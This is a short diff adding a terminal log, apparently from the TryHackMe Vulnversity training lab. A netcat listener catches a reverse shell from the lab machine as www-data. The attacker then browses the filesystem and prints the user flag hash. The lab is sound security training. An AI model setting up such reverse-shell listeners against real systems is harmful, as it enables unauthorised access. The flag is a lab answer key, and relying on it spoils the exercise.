@@ -1,0 +1,47 @@
+┌──(kali㉿kali)-[~/GitHub/TryHackMe/Vulnversity]               
+└─$ nc -lvnp 443                                               
+listening on [any] 443 ...                                     
+connect to [10.6.85.73] from (UNKNOWN) [10.10.158.208] 34076   
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux            
+ 20:33:48 up 31 min,  0 users,  load average: 0.00, 0.00, 0.06 
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                           
+uid=33(www-data) gid=33(www-data) groups=33(www-data)          
+/bin/sh: 0: can't access tty; job control turned off           
+$ whoami                                                       
+www-data                                                       
+$ ls                                                           
+bin                                                            
+boot                                                           
+dev                                                            
+etc                                                            
+home                                                           
+initrd.img                                                     
+lib                                                            
+lib64                                                          
+lost+found                                                     
+media                                                          
+mnt                                                            
+opt                                                            
+proc                                                           
+root                                                           
+run                                                            
+sbin                                                           
+snap                                                           
+srv                                                            
+sys                                                            
+tmp                                                            
+usr                                                            
+var                                                            
+vmlinuz                                                        
+$ cd home                                                      
+$ ls                                                           
+bill                                                           
+$ cd bill                                                      
+ls                                                             
+$ user.txt                                                     
+$ cat user.txt                                                 
+8bd7992fbe8a6ad22a63361004cfcedb                               
+$ exit                                                         
+
+┌──(kali㉿kali)-[~/GitHub/TryHackMe/Vulnversity]               
+└─$                                                            
